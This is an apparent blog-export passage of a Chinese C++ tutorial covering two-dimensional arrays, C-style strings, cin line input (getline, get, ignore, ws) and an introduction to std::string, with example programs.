来初始化二维数组。外层花括号代表整个数组，内层花括号代表每一行。 完整初始化: 提供所有行的初始化列表。 12345int matrix[3][4] = &#123; // 3 行 4 列 &#123;1, 2, 3, 4&#125;, // 初始化第 0 行 &#123;5, 6, 7, 8&#125;, // 初始化第 1 行 &#123;9, 10, 11, 12&#125; // 初始化第 2 行&#125;; 部分初始化: 如果提供的初始化值不足，剩余元素会被自动初始化为 0（对于数值类型）。 12345678int partial[3][4] = &#123; &#123;1, 2&#125;, // 第 0 行: &#123;1, 2, 0, 0&#125; &#123;5&#125; // 第 1 行: &#123;5, 0, 0, 0&#125; // 第 2 行: &#123;0, 0, 0, 0&#125; (未提供初始化列表)&#125;;// 将整个二维数组初始化为 0int allZeros[10][20] = &#123;0&#125;; // 或 C++11: int allZeros[10][20] &#123;&#125;; 省略行数 (但不能省略列数): 如果在声明时提供了初始化列表，可以省略第一个维度（行数），编译器会根据初始化列表推断行数。但第二个维度（列数）必须指定。 1234int inferredRows[][4] = &#123; // 列数必须是 4 &#123;1, 1, 1, 1&#125;, &#123;2, 2, 2, 2&#125;&#125;; // 编译器推断行数为 2 C++11 列表初始化: 可以省略等号 =。 12int matrix_cpp11[2][3] &#123; &#123;1, 2, 3&#125;, &#123;4, 5, 6&#125; &#125;;int zeros_cpp11[5][5] &#123;&#125;; // 所有元素初始化为 0 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 完整初始化 int data[2][3] = &#123; &#123;10, 20, 30&#125;, &#123;40, 50, 60&#125; &#125;; // 部分初始化 float coords[3][2] = &#123; &#123;1.1f, 2.2f&#125;, &#123;3.3f&#125; // &#123;3.3f, 0.0f&#125; // 第三行为 &#123;0.0f, 0.0f&#125; &#125;; // 省略行数 char messages[][10] = &#123; // 列数必须指定 &quot;Hello&quot;, &quot;World&quot; &#125;; // 推断为 2 行 10 列 // C++11 初始化 int table[2][2] &#123; &#123;1&#125;, &#123;3, 4&#125; &#125;; // &#123;&#123;1, 0&#125;, &#123;3, 4&#125;&#125; std::cout &lt;&lt; &quot;data[1][1]: &quot; &lt;&lt; data[1][1] &lt;&lt; std::endl; // 输出 50 std::cout &lt;&lt; &quot;coords[1][1]: &quot; &lt;&lt; coords[1][1] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;messages[0]: &quot; &lt;&lt; messages[0] &lt;&lt; std::endl; // 输出 Hello std::cout &lt;&lt; &quot;table[0][1]: &quot; &lt;&lt; table[0][1] &lt;&lt; std::endl; // 输出 0 return 0;&#125; 5.6.2 使用二维数组访问二维数组的元素需要提供两个索引：第一个是行索引，第二个是列索引。索引同样从 0 开始。 访问语法: 1arrayName[rowIndex][columnIndex] 使用嵌套循环处理二维数组: 嵌套循环是处理二维数组所有元素的标准方法。通常，外层循环遍历行，内层循环遍历列。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;const int NUM_CITIES = 3;const int NUM_MONTHS = 4; // 假设只记录 4 个月的数据int main() &#123; // 存储 3 个城市 4 个月的平均气温 double temperatures[NUM_CITIES][NUM_MONTHS] = &#123; &#123;10.5, 12.1, 15.3, 18.0&#125;, // City 0 &#123;8.2, 9.5, 13.0, 16.5&#125;, // City 1 &#123;12.0, 14.5, 17.8, 21.2&#125; // City 2 &#125;; std::cout &lt;&lt; &quot;Monthly average temperatures:&quot; &lt;&lt; std::endl; // 使用嵌套循环遍历并打印所有温度 for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; // 外层循环遍历城市 (行) std::cout &lt;&lt; &quot;City &quot; &lt;&lt; city &lt;&lt; &quot;: &quot;; for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; // 内层循环遍历月份 (列) std::cout &lt;&lt; temperatures[city][month] &lt;&lt; &quot;\\t&quot;; // 使用行和列索引访问元素 &#125; std::cout &lt;&lt; std::endl; &#125; // 计算 City 1 的总温度和平均温度 double city1_total = 0.0; int city_index = 1; // 要计算的城市索引 for (int month = 0; month &lt; NUM_MONTHS; ++month) &#123; city1_total += temperatures[city_index][month]; &#125; double city1_average = city1_total / NUM_MONTHS; std::cout &lt;&lt; &quot;\\nAverage temperature for City &quot; &lt;&lt; city_index &lt;&lt; &quot;: &quot; &lt;&lt; city1_average &lt;&lt; std::endl; // 计算所有城市第一个月的平均温度 double month0_total = 0.0; int month_index = 0; // 要计算的月份索引 for (int city = 0; city &lt; NUM_CITIES; ++city) &#123; month0_total += temperatures[city][month_index]; &#125; double month0_average = month0_total / NUM_CITIES; std::cout &lt;&lt; &quot;Average temperature for Month &quot; &lt;&lt; month_index &lt;&lt; &quot; across all cities: &quot; &lt;&lt; month0_average &lt;&lt; std::endl; return 0;&#125; 内存布局:在内存中，二维数组通常是按行主序 (Row-Major Order) 存储的。这意味着第一行的所有元素连续存储，然后是第二行的所有元素，依此类推。例如，matrix[3][4] 的内存布局看起来像：matrix[0][0], matrix[0][1], matrix[0][2], matrix[0][3], matrix[1][0], matrix[1][1], ... , matrix[2][3] 理解这一点对于将二维数组传递给函数（通常需要知道列数）或进行某些指针操作很重要。 5.7 总结本章重点介绍了C++中的循环结构和关系表达式，它们是控制程序流程和处理重复任务的基础。 我们学习了三种主要的循环语句： for 循环: 这是一种入口条件循环，其头部包含了初始化、测试条件和更新三个部分，结构清晰，特别适用于计数或已知迭代次数的情况。我们探讨了其组成部分、如何修改步长、使用它访问字符串（C风格和std::string），并详细学习了递增 (++) 和递减 (--) 运算符（包括前缀和后缀形式及其区别、副作用和顺序点问题、在指针上的应用）。此外，还介绍了组合赋值运算符（如 +=, -=）和逗号运算符在 for 循环中的应用。 while 循环: 这也是一种入口条件循环，但结构更简单，只包含一个测试条件。它适用于循环次数不确定、依赖于某个条件持续满足的情况。我们比较了 for 和 while 的适用场景，并了解了如何使用循环（虽然不推荐）以及现代 C++ 的 &lt;chrono&gt; 和 &lt;thread&gt; 库来实现延时。 do while 循环: 这是一种出口条件循环，其特点是循环体至少执行一次，然后在每次迭代结束时检查条件。它适用于需要确保操作至少发生一次的场景，如用户输入验证。 C++11 引入的基于范围的 for 循环提供了一种更简洁、更安全的遍历序列（如数组、vector、string、初始化列表）中所有元素的方式。我们学习了其语法、如何使用 auto、引用 (&amp;) 和常量引用 (const &amp;) 来声明循环变量，以及它的优点和局限性（如无法直接获取索引）。 关系表达式使用关系运算符（&lt;, &gt;, &lt;=, &gt;=, ==, !=）来比较值，结果为布尔值 true 或 false，常用于循环和分支语句的条件判断。我们特别强调了将赋值运算符 (=) 误用为比较运算符 (==) 的常见错误及其后果。对于字符串比较，我们了解到 C 风格字符串需要使用 &lt;cstring&gt; 中的 strcmp() 函数来比较内容，而 std::string 类则可以直接使用重载的关系运算符进行内容的字典序比较。 本章还深入探讨了循环与文本输入的结合。我们分析了 cin &gt;&gt; 读取单词（跳过并停止于空白）的行为，以及如何使用 cin.get(char) 和无参数的 cin.get() 来逐个读取字符（包括空白符）。我们学习了如何检测文件尾 (EOF) 条件以正确终止输入循环，包括检查 cin 流状态和 cin.get() 的返回值。最后，我们了解了读取 C 风格字符串的 cin.get(buffer, size) 版本及其与 getline 的区别（分隔符处理）。 最后，我们学习了嵌套循环的概念，即一个循环包含在另一个循环内部，以及如何使用嵌套循环来处理二维数组（数组的数组）。我们了解了二维数组的初始化方法和如何使用双重索引 [row][col] 配合嵌套循环来访问和处理其所有元素。 通过本章的学习，我们掌握了 C++ 中控制重复执行和进行比较的核心工具，为编写更复杂、更强大的程序奠定了基础。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 4 复合类型","slug":"Cpp_tutorial_Chapter_4","date":"2025-04-26T12:03:35.367Z","updated":"2025-04-26T12:01:30.715Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_4/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_4/","excerpt":"","text":"4.1 数组数组 (Array) 是一种复合类型 (Compound Type)**，它允许你存储多个相同类型的值。数组中的每个值称为一个元素 (Element)，可以通过索引 (Index)** 或下标 (Subscript) 来访问特定元素。 4.1.1 程序说明想象一下，你需要存储一年中每个月的销售额。你可以声明12个独立的 double 变量： 1double salesJan, salesFeb, salesMar, /* ..., */ salesDec; 这种方法非常繁琐，尤其是在需要处理大量数据时。数组提供了一种更简洁、更强大的方式来处理这种情况。 数组声明: 声明一个数组需要指定： 元素类型: 数组中存储的数据类型。 数组名称: 变量名。 数组大小: 数组可以容纳的元素数量，必须是一个常量表达式（在编译时就能确定其值的表达式，例如字面常量、const 常量、枚举量或 sizeof 表达式的结果），并且必须放在方括号 [] 内。 语法: 1typeName arrayName[arraySize]; 示例: 123456789// 声明一个可以存储 12 个 double 类型值的数组，名为 monthlySalesdouble monthlySales[12]; // 声明一个可以存储 5 个 int 类型值的数组，名为 scoresint scores[5];// 使用 const 常量定义数组大小const int NUM_STUDENTS = 30;int studentGrades[NUM_STUDENTS]; 访问数组元素: 使用数组名和方括号内的索引来访问数组元素。C++数组的索引从 0 开始。对于大小为 N 的数组，有效的索引范围是 0 到 N-1。 1234567891011121314// 访问 monthlySales 数组的第一个元素 (一月)monthlySales[0] = 1500.50; // 访问 monthlySales 数组的第三个元素 (三月)monthlySales[2] = 2100.75; // 访问 scores 数组的最后一个元素scores[4] = 95; // 读取 scores 数组的第二个元素int secondScore = scores[1]; std::cout &lt;&lt; &quot;March sales: &quot; &lt;&lt; monthlySales[2] &lt;&lt; std::endl;std::cout &lt;&lt; &quot;Second score: &quot; &lt;&lt; secondScore &lt;&lt; std::endl; 重要: C++ 不会自动检查数组索引是否越界。访问 arrayName[N] 或 arrayName[-1]（对于大小为 N 的数组）是**未定义行为 (Undefined Behavior)**，可能导致程序崩溃或数据损坏。程序员有责任确保使用的索引在有效范围内 (0 到 arraySize - 1)。 数组大小必须是常量表达式: 1234567int n = 10;// int dynamicArray[n]; // 错误! C++ 标准不允许使用变量作为数组大小 (虽然某些编译器可能作为扩展支持)const int SIZE = 5;int staticArray[SIZE]; // 正确! SIZE 是 const 常量int anotherArray[10]; // 正确! 10 是字面常量 如果需要在运行时确定数组大小，应该使用动态内存分配（new）或标准库提供的容器（如 std::vector），我们将在后续章节学习。 4.1.2 数组的初始化规则在声明数组时，可以同时对其进行初始化。初始化使用花括号 &#123;&#125; 括起来的**初始化列表 (Initializer List)**。 规则: 完整初始化: 提供与数组大小相同数量的初始值。 12int scores[5] = &#123;90, 85, 92, 78, 88&#125;; // scores[0]=90, scores[1]=85, ..., scores[4]=88double lengths[3] = &#123;1.2, 3.4, 0.5&#125;; 部分初始化: 如果提供的初始值数量少于数组大小，则剩余的元素会被自动初始化为 0（对于数值类型）或相应的零等价值（对于其他类型，如字符数组的空字符 \\0）。 1234567int counts[10] = &#123;1, 2, 3&#125;; // counts[0]=1, counts[1]=2, counts[2]=3 // counts[3] 到 counts[9] 都被初始化为 0float readings[5] = &#123;9.8f&#125;; // readings[0]=9.8f, 其他元素为 0.0f// 将数组所有元素初始化为 0 的常用方法int allZeros[100] = &#123;0&#125;; 省略数组大小: 如果在声明时提供了初始化列表，可以省略方括号中的数组大小。编译器会根据初始化列表中的元素数量自动推断数组大小。 12short values[] = &#123;10, 20, 30, 40&#125;; // 编译器推断数组大小为 4char message[] = &#123;&#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;\\0&#x27;&#125;; // 大小为 6 (包括空字符) 不允许初始化列表元素过多: 初始化列表中的元素数量不能超过数组声明的大小。 1// int errors[3] = &#123;1, 2, 3, 4&#125;; // 错误! 初始化列表元素过多 未初始化数组: 如果在声明数组时没有提供初始化列表（仅适用于非静态局部数组），则数组元素的值是未定义的 (indeterminate)**，它们会包含内存中遗留的垃圾值。使用未初始化的变量是常见的错误来源。** 12345678int main() &#123; int garbage[5]; // 数组元素的值是未定义的 (垃圾值) // std::cout &lt;&lt; garbage[0]; // 错误! 使用未初始化的值 static int staticGarbage[5]; // 静态存储数组会被默认初始化为 0 // std::cout &lt;&lt; staticGarbage[0]; // 输出 0 return 0;&#125; (静态存储持续性的变量，如全局变量、命名空间变量、静态局部变量，会被默认零初始化) 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // 完整初始化 int fibonacci[8] = &#123;0, 1, 1, 2, 3, 5, 8, 13&#125;; std::cout &lt;&lt; &quot;Fibonacci[5]: &quot; &lt;&lt; fibonacci[5] &lt;&lt; std::endl; // 输出 8 // 部分初始化 double data[5] = &#123;1.1, 2.2&#125;; std::cout &lt;&lt; &quot;Data[0]: &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 输出 1.1 std::cout &lt;&lt; &quot;Data[1]: &quot; &lt;&lt; data[1] &lt;&lt; std::endl; // 输出 2.2 std::cout &lt;&lt; &quot;Data[2]: &quot; &lt;&lt; data[2] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Data[3]: &quot; &lt;&lt; data[3] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Data[4]: &quot; &lt;&lt; data[4] &lt;&lt; std::endl; // 输出 0 // 省略大小 char vowels[] = &#123;&#x27;a&#x27;, &#x27;e&#x27;, &#x27;i&#x27;, &#x27;o&#x27;, &#x27;u&#x27;&#125;; std::cout &lt;&lt; &quot;Number of vowels: &quot; &lt;&lt; sizeof(vowels) / sizeof(char) &lt;&lt; std::endl; // 输出 5 // 初始化所有元素为 0 int results[20] = &#123;0&#125;; std::cout &lt;&lt; &quot;Results[15]: &quot; &lt;&lt; results[15] &lt;&lt; std::endl; // 输出 0 return 0;&#125; 4.1.3 C++11数组初始化方法C++11 引入了更统一的初始化语法，称为列表初始化 (List Initialization) 或**花括号初始化 (Brace Initialization)**，它也可以用于数组。 主要变化: 可以省略等号 =: 在使用初始化列表时，可以省略声明语句中的等号。 禁止缩窄转换 (Narrowing Conversion): 列表初始化不允许可能导致数据丢失的“缩窄”转换。例如，不能将浮点数直接初始化给整型数组元素，也不能将超出范围的整数值初始化给较小范围的整型数组元素。 语法: 12typeName arrayName[arraySize] &#123;initializer_list&#125;; // C++11 列表初始化 (可省略等号)typeName arrayName[] &#123;initializer_list&#125;; // 省略大小 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; // C++11 列表初始化 (省略等号) int scores[5] &#123;90, 85, 92, 78, 88&#125;; double lengths[3] &#123;1.2, 3.4, 0.5&#125;; int counts[10] &#123;1, 2, 3&#125;; // 部分初始化，剩余元素为 0 int allZeros[100] &#123;&#125;; // 所有元素初始化为 0 (空列表) short values[] &#123;10, 20, 30, 40&#125;; // 省略大小 std::cout &lt;&lt; &quot;Scores[1]: &quot; &lt;&lt; scores[1] &lt;&lt; std::endl; // 输出 85 std::cout &lt;&lt; &quot;Counts[5]: &quot; &lt;&lt; counts[5] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;allZeros[50]: &quot; &lt;&lt; allZeros[50] &lt;&lt; std::endl; // 输出 0 std::cout &lt;&lt; &quot;Size of values: &quot; &lt;&lt; sizeof(values) / sizeof(short) &lt;&lt; std::endl; // 输出 4 // 禁止缩窄转换示例 // int errors[3] &#123;1, 2, 3.0&#125;; // 错误! double (3.0) 到 int 是缩窄转换 // char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // 错误! 300 超出 char 的范围 (假设 char 是 8 位) // 允许非缩窄转换 char chars_ok[3] &#123; &#x27;a&#x27;, 66, &#x27;c&#x27; &#125;; // 66 在 char 范围内，可以隐式转换为 &#x27;B&#x27; std::cout &lt;&lt; &quot;Chars OK: &quot; &lt;&lt; chars_ok[0] &lt;&lt; chars_ok[1] &lt;&lt; chars_ok[2] &lt;&lt; std::endl; // 输出 aBc return 0;&#125; 建议: C++11 的列表初始化提供了更一致、更安全的初始化方式，推荐在支持 C++11 及更高标准的项目中使用。特别是 typeName arrayName[size] &#123;&#125;; 这种将所有元素初始化为零值的形式非常方便。 4.2 字符串字符串是程序中用于表示文本信息的重要数据类型。C++处理字符串有两种主要方式： C风格字符串 (C-Style String): 这是继承自C语言的方式，将字符串视为存储在 char 数组中并以空字符 (\\0) 结尾的字符序列。 string 类: C++标准库提供了一个强大的 string 类，提供了更方便、更安全的字符串操作（将在 4.3 节介绍）。 本节主要关注 C 风格字符串。 字符串字面值 (String Literal) 或字符串常量 (String Constant):在代码中用双引号 &quot;&quot; 括起来的字符序列，例如 &quot;Hello, world!&quot;, &quot;C++&quot;, &quot;&quot; (空字符串)。它们存储在内存的只读区域。编译器会自动在字符串字面值的末尾添加空字符 \\0。 4.2.1 拼接字符串常量C++允许将相邻的字符串字面值自动拼接（连接）成一个单独的字符串。这对于将较长的字符串分成多行书写非常有用，可以提高代码的可读性。 用法与示例: 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;int main() &#123; // 相邻的字符串字面值会被自动拼接 std::cout &lt;&lt; &quot;This is the first part, &quot; &quot;and this is the second part.&quot; &lt;&lt; std::endl; // 输出: This is the first part, and this is the second part. // 可以跨越多行 std::cout &lt;&lt; &quot;Line 1: Some text...\\n&quot; &quot;Line 2: More text...\\n&quot; &quot;Line 3: Final line.&quot; &lt;&lt; std::endl; /* 输出: Line 1: Some text... Line 2: More text... Line 3: Final line. */ // 拼接结果是一个单独的字符串常量 const char* long_message = &quot;Part 1. &quot; &quot;Part 2. &quot; &quot;Part 3.&quot;; std::cout &lt;&lt; long_message &lt;&lt; std::endl; // 输出: Part 1. Part 2. Part 3. // 注意：变量和字符串字面值不能自动拼接 std::string part1 = &quot;Hello&quot;; // std::cout &lt;&lt; part1 &quot; world!&quot;; // 错误! 不能这样拼接变量和字面值 // 需要使用 string 类的拼接操作 (见 4.3 节) 或 cout 的链式输出 std::cout &lt;&lt; part1 &lt;&lt; &quot; world!&quot; &lt;&lt; std::endl; // 正确 return 0;&#125; 4.2.2 在数组中使用字符串C风格字符串本质上是 char 类型的数组，其特殊之处在于最后一个字符必须是**空字符 (\\0)**。这个空字符标记了字符串的实际结束位置。 声明和初始化: 可以使用字符串字面值来初始化 char 数组。编译器会自动计算大小（包括末尾的 \\0）并将其复制到数组中。 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;cstring&gt; // 包含 C 风格字符串函数库 (例如 strlen)int main() &#123; // 使用字符串字面值初始化 char 数组 char dog[8] = &quot;fatcat&quot;; // 数组大小必须足够容纳字符串 + 空字符 (&#x27;f&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27;) // dog 数组大小为 8，实际使用 7 个字符 + 1 个空字符 char bird[] = &quot;wren&quot;; // 编译器自动推断大小为 5 (&#x27;w&#x27;,&#x27;r&#x27;,&#x27;e&#x27;,&#x27;n&#x27;,&#x27;\\0&#x27;) // 使用列表初始化 (需要显式包含空字符) char fish[] = &#123;&#x27;t&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;t&#x27;, &#x27;\\0&#x27;&#125;; // 错误示例：数组大小不足 // char cat[3] = &quot;cat&quot;; // 错误! 需要大小 4 来存储 &#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;,&#x27;\\0&#x27; std::cout &lt;&lt; &quot;Dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // cout 遇到空字符停止输出 std::cout &lt;&lt; &quot;Bird: &quot; &lt;&lt; bird &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Fish: &quot; &lt;&lt; fish &lt;&lt; std::endl; // 访问单个字符 std::cout &lt;&lt; &quot;Third letter of dog: &quot; &lt;&lt; dog[2] &lt;&lt; std::endl; // 输出 &#x27;t&#x27; dog[0] = &#x27;p&#x27;; // 可以修改数组内容 std::cout &lt;&lt; &quot;Modified dog: &quot; &lt;&lt; dog &lt;&lt; std::endl; // 输出 &quot;patcat&quot; // strlen() 函数计算字符串长度 (不包括空字符) std::cout &lt;&lt; &quot;Length of dog: &quot; &lt;&lt; std::strlen(dog) &lt;&lt; std::endl; // 输出 6 (因为现在是 &quot;patcat&quot;) std::cout &lt;&lt; &quot;Length of bird: &quot; &lt;&lt; std::strlen(bird) &lt;&lt; std::endl; // 输出 4 // sizeof() 计算整个数组占用的内存大小 (包括空字符和未使用的空间) std::cout &lt;&lt; &quot;Size of dog array: &quot; &lt;&lt; sizeof(dog) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出 8 std::cout &lt;&lt; &quot;Size of bird array: &quot; &lt;&lt; sizeof(bird) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // 输出 5 return 0;&#125; 关键点: 存储 C 风格字符串的 char 数组大小必须至少是字符串长度加 1（为 \\0 留出空间）。 字符串字面值初始化会自动添加 \\0。 列表初始化需要手动添加 \\0。 strlen() 计算的是到 \\0 为止的字符数。 sizeof() 计算的是整个数组的字节大小。 4.2.3 字符串输入使用 cin 和 &gt;&gt; 运算符读取 C 风格字符串（存储在 char 数组中）时，存在一个主要限制：cin 默认以空白字符（空格、制表符、换行符）作为输入的分隔符。这意味着 cin &gt;&gt; 只会读取到第一个空白字符之前的部分。 用法与示例: 123456789101112131415161718#include &lt;iostream&gt;int main() &#123; const int SIZE = 20; char name[SIZE]; char dessert[SIZE]; std::cout &lt;&lt; &quot;Enter your first name: &quot;; std::cin &gt;&gt; name; // 读取直到遇到第一个空白字符 std::cout &lt;&lt; &quot;Enter your favorite dessert: &quot;; std::cin &gt;&gt; dessert; // 读取直到遇到第一个空白字符 std::cout &lt;&lt; &quot;Hello, &quot; &lt;&lt; name &lt;&lt; &quot;!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;I see you like &quot; &lt;&lt; dessert &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; return 0;&#125; 运行示例及问题: 如果用户输入： 12Enter your first name: Ada LovelaceEnter your favorite dessert: Chocolate Cake 程序输出将会是： 12Hello, Ada!I see you like Lovelace. 原因: cin &gt;&gt; name; 读取到 “Ada” 后遇到空格停止，”Ada” 被存入 name 数组（并自动添加 \\0）。 “ Lovelace\\nChocolate Cake\\n” 仍然留在输入缓冲区中。 cin &gt;&gt; dessert; 从缓冲区开始读取，跳过开头的空格，读取到 “Lovelace” 后遇到换行符停止，”Lovelace” 被存入 dessert 数组。 这显然不是我们期望的结果。cin &gt;&gt; 不适合读取包含空格的字符串。此外，如果用户输入的单词长度超过了数组的大小（减去 \\0 的空间），还会导致**缓冲区溢出 (Buffer Overflow)**，这是严重的安全隐患。 4.2.4 每次读取一行字符串输入为了解决 cin &gt;&gt; 的问题，iostream 库提供了其他成员函数来读取整行输入，包括其中的空格，直到遇到换行符为止。常用的有两个：getline() 和 get()。 1. cin.getline(char* buffer, int size, char delimiter = &#39;\\n&#39;) buffer: 用于存储输入的 char 数组。 size: 缓冲区的大小。getline() 最多读取 size - 1 个字符，以确保有空间存放末尾的空字符 \\0。 delimiter (可选): 指定读取停止的分隔符，默认为换行符 \\n。 行为: 读取字符到 buffer 中，直到读取了 size - 1 个字符、遇到 delimiter 或到达文件末尾。 如果遇到 delimiter，它会读取并丢弃该分隔符（通常是换行符）。 总是在读取的字符序列末尾添加空字符 \\0。 2. cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;) 参数与 getline() 类似。 行为: 读取字符到 buffer 中，直到读取了 size - 1 个字符、遇到 delimiter 或到达文件末尾。 与 getline() 不同的是，如果遇到 delimiter，它不会读取该分隔符，而是将其留在输入缓冲区中。 总是在读取的字符序列末尾添加空字符 \\0。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; const int SIZE = 50; char fullName[SIZE]; char address[SIZE]; // 使用 getline() std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(fullName, SIZE); // 读取整行，包括空格，丢弃换行符 std::cout &lt;&lt; &quot;Enter your address: &quot;; std::cin.getline(address, SIZE); // 读取下一行 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; fullName &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address: &quot; &lt;&lt; address &lt;&lt; std::endl; std::cout &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // 使用 get() - 注意换行符问题 char title[SIZE]; char author[SIZE]; std::cout &lt;&lt; &quot;Enter book title: &quot;; std::cin.get(title, SIZE); // 读取整行，换行符留在缓冲区 // 如果直接调用下一个 get()，它会立即读到上一个留下的换行符并停止 // std::cin.get(author, SIZE); // 这将导致 author 为空 // 需要处理掉留下的换行符 // 方法一：再调用一次 get() 读取单个字符 // std::cin.get(); // 读取并丢弃换行符 // 方法二：使用 ignore() 跳过字符 std::cin.ignore(100, &#x27;\\n&#x27;); // 跳过最多100个字符，直到遇到换行符（并丢弃换行符） std::cout &lt;&lt; &quot;Enter author name: &quot;; std::cin.get(author, SIZE); // 现在可以正确读取作者名 std::cout &lt;&lt; &quot;Title: &quot; &lt;&lt; title &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Author: &quot; &lt;&lt; author &lt;&lt; std::endl; return 0;&#125; 选择 getline() 还是 get()? getline() 通常更方便，因为它会自动处理掉行尾的换行符，使得连续读取多行输入更简单。 get() 提供了更精细的控制，因为它允许你检查下一个字符是否是换行符，但需要你手动处理留在缓冲区的分隔符。 空行和 getline(): 如果 getline() 遇到空行（即用户直接按 Enter），它会读取这个空行，将一个空字符串（只包含 \\0）存入缓冲区，并丢弃换行符。 4.2.5 混合输入字符串和数字当程序需要交替读取数字（使用 cin &gt;&gt;）和整行字符串（使用 cin.getline() 或 cin.get()）时，经常会遇到一个问题：cin &gt;&gt; 读取数字后，会将数字后面的换行符留在输入缓冲区中。 如果紧接着调用 cin.getline() 或 cin.get()，它们会立即读到这个残留的换行符，并认为已经到达行尾，导致读取失败或读到空字符串。 问题示例: 1234567891011121314151617#include &lt;iostream&gt;int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // 读取年龄，换行符留在缓冲区 std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // 立即读到残留的换行符，getline 结束，name 为空 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; // 输出 Name: [] return 0;&#125; 解决方法: 在读取数字后、调用 getline() 或 get() 读取整行之前，需要消耗掉输入缓冲区中残留的换行符。 使用 cin.ignore(): 这是常用的方法。cin.ignore(n, delim) 会跳过输入流中的字符，直到跳过了 n 个字符，或者遇到了 delim 分隔符（并丢弃该分隔符），以先到者为准。通常用于丢弃换行符： 123std::cin.ignore(100, &#x27;\\n&#x27;); // 跳过最多100个字符，直到并包括下一个换行符// 或者更简单地，如果确定只有一个换行符需要丢弃// std::cin.ignore(); // 跳过下一个字符 (即换行符) 使用 (cin &gt;&gt; ws): C++11 引入了 std::ws 输入流操纵符，它可以读取并丢弃输入流开头的所有空白字符（包括换行符）。 1(std::cin &gt;&gt; std::ws).getline(name, 50); 使用 cin.get() 读取单个字符: 1std::cin.get(); // 读取并丢弃换行符 修正后的示例 (使用 cin.ignore()): 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;limits&gt; // 为了 numeric_limits (更健壮的 ignore)int main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; // 清除输入缓冲区，特别是换行符 std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); // numeric_limits&lt;streamsize&gt;::max() 获取流能处理的最大字符数，确保清除整行 std::cout &lt;&lt; &quot;Enter your full name: &quot;; std::cin.getline(name, 50); // 现在可以正确读取姓名 std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; 修正后的示例 (使用 ws): 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;ios&gt; // 为了 wsint main() &#123; int age; char name[50]; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Enter your full name: &quot;; // 在 getline 之前使用 ws 跳过空白符 (std::cin &gt;&gt; std::ws).getline(name, 50); std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Name: [&quot; &lt;&lt; name &lt;&lt; &quot;]&quot; &lt;&lt; std::endl; return 0;&#125; 总结: 混合输入数字和整行字符串时，务必记得在 cin &gt;&gt; number; 之后、调用 getline() 或 get() 之前，清除输入缓冲区中残留的换行符。使用 cin.ignore() 或 (cin &gt;&gt; ws) 是推荐的做法。 4.3 string类简介虽然 C 风格字符串（字符数组）在 C++ 中仍然可用，但 C++ 标准库提供了一个更强大、更方便、更安全的替代品：std::string 类。 string 类是标准库的一部分，它封装了字符序列的操作，提供了自动内存管理和丰富的成员函数来处理字符串。要使用 string 类，需要包含 &lt;string&gt; 头文件。 基本概念: 对象: string 类型的变量是**对象 (Object)**。对象是类的实例。 自动内存管理: 与需要手动管理内存（确保数组足够大，处理空字符）的 C 风格字符串不同，string 对象会自动处理内存分配和释放。它可以根据需要动态增长或缩小。 成员函数: string 类提供了许多内置的操作（成员函数），如获取长度、拼接、查找、替换等，使得字符串处理更加容易。 基本用法: 123456789101112131415161718192021#include &lt;iostream&gt;#include 